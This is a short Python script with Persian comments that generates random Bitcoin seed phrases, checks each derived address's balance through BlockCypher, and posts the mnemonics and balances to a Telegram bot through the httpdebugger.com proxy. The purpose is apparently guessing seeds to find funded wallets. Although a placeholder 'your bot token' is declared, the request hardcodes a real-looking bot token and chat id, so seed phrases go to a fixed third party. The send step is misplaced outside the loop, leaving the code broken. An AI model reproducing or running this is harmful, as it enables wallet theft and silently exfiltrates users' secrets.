import requests
import time
from mnemonic import Mnemonic
from bitcoinlib.wallets import Wallet

# ایجاد شی Mnemonic برای تولید عبارت بازیابی
mnemo = Mnemonic("english")
num_iterations = 10  # تعداد کیف پول‌های ایجاد شده

telegram_token = "توکن_ربات_شما"
chat_id = "299233265"

for i in range(num_iterations):
    # تولید عبارت یادآوری ۱۲ کلمه‌ای
    mnemonic_phrase = mnemo.generate(strength=128)
    
    # ایجاد نام منحصربه‌فرد برای کیف پول
    wallet_name = f"Wallet_{i}_{int(time.time())}"

    # ایجاد کیف پول جدید
    wallet = Wallet.create(wallet_name, keys=mnemonic_phrase, network='bitcoin')

    # دریافت آدرس کیف پول
    address = wallet.get_key().address

    # دریافت موجودی از بلاکچین
    blockcypher_url = f"https://api.blockcypher.com/v1/btc/main/addrs/{address}/balance"
    response = requests.get(blockcypher_url).json()
    balance = response.get("final_balance", "نامشخص")

    # ساخت پیام
    message = f"نام کیف پول: {wallet_name}\nعبارت یادآوری: {mnemonic_phrase}\nآدرس کیف پول: {address}\nموجودی: {balance} ساتوشی."

    # ارسال پیام به تلگرام

url = ("https://api.telegram.org/bot7424373311:AAG0WvIbWo--1_G-dSSP4ncllVHbHhewNo8/sendmessage?chat_id=299233265&text="+str(message))
darkhast = {
"UrlBox" : url,
"AgentList" : "Google Chrome",
"versionlist":"HTTP/1.1",
"MethodList": "POST"

}
req = requests.post("https://www.httpdebugger.com/Tools/ViewHttpHeaders.aspx",darkhast) 
print(req)
